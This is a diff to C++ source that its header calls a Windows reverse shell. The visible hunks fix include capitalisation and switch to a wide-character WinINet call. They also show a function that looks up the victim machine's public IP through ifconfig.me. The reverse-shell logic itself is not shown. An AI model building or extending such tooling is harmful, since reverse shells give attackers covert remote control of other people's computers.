@@ -3,10 +3,10 @@ author: @Reycecar
 Windows reverse shell
 */
 #include <winsock2.h>
-#include <Windows.h>
+#include <windows.h>
 #include <ws2tcpip.h>
 #include <stdio.h>
-#include <tlhelp32.h>
+#include <TlHelp32.h>
 #include <iostream>
 #include <fstream>
 #include <sstream>
@@ -15,8 +15,8 @@ Windows reverse shell
 #include <wininet.h>
 #include <winsock.h>
 #include <iptypes.h>
+#include <string>
 #include <iphlpapi.h>
-//#include <fileapi.h>
 #include <string.h>
 #include <rpc.h>
 #pragma comment(lib, "Ws2_32.lib")
@@ -112,7 +112,7 @@ std::string get_response_string(HANDLE hReq) {
 
 // Function for getting the public facing IP address.
 std::string getPublicIP() {
-	HANDLE hInt = InternetOpen(L"Mozilla/5.0",INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL, 0);
+	HANDLE hInt = InternetOpenW(L"Mozilla/5.0",INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL, 0);
 	// Create hConnect handle for ifconfig.me
 	HANDLE hConn = InternetConnectA(hInt, "ifconfig.me", 80, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
 	// Pass hConnect handle into HttpOpenRequestA with request to ifconfig.me/ip
